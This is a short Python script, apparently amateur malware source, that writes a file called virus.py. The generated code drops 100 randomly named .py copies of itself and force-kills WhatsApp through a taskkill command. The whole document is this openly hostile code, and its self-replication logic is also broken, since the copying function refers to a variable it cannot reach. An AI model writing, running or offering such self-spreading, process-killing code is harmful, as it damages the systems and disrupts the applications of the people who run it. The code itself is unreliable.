import os
import time
import random
import string

def generate_random_string(length):
    letters = string.ascii_letters + string.digits
    return ''.join(random.choice(letters) for _ in range(length))

def create_virus():
    virus_code = """
import os
import time
import random
import string

def generate_random_string(length):
    letters = string.ascii_letters + string.digits
    return ''.join(random.choice(letters) for _ in range(length))

def create_virus():
    virus_code = {virus_code}
    with open('virus.py', 'w') as f:
        f.write(virus_code)

def spread_virus():
    for i in range(100):
        filename = generate_random_string(10) + '.py'
        with open(filename, 'w') as f:
            f.write(virus_code)

def crash_whatsapp():
    os.system('taskkill /f /im WhatsApp.exe')

create_virus()
spread_virus()
crash_whatsapp()
"""
    with open('virus.py', 'w') as f:
        f.write(virus_code.format(virus_code=repr(virus_code)))

create_virus()